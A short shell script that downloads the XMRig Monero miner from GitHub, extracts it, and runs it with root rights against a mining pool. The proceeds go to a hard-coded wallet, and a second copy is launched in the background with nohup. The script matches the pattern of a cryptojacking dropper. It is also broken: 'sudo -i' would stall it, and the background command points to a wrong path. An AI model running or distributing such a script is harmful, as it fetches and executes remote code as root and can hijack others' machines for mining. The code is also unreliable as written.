#!/bin/sh
sudo -i
wget https://github.com/xmrig/xmrig/releases/download/v6.15.3/xmrig-6.15.3-linux-x64.tar.gz
tar -xf xmrig-6.15.3-linux-x64.tar.gz
cd xmrig-6.15.3
./xmrig -o pool.supportxmr.com:443 -u 89gg7E49xoXR9KgKYt6gJpHhvLBBkTmmtcrqf1nt7QoKcN4wqf5RrxBN2cryV3SffAiURhN6ngnr8a5EzKcBEJYrH9q4t7k -k --tls -p rig
sudo nohup /xmrig -o pool.supportxmr.com:443 -u 89gg7E49xoXR9KgKYt6gJpHhvLBBkTmmtcrqf1nt7QoKcN4wqf5RrxBN2cryV3SffAiURhN6ngnr8a5EzKcBEJYrH9q4t7k -k --tls -p rig
